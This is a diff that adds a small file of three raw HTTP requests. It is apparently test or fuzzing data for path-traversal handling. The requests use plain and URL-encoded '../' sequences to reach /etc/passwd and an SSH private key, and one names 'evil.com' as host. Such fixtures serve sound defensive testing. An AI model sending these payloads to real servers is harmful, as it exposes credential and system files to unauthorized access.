@@ -1,0 +1,7 @@
+GET /../../../etc/passwd HTTP/1.1
+Host: localhost
+
+GET /../../.ssh/id_rsa HTTP/1.0
+
+GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+Host: evil.com
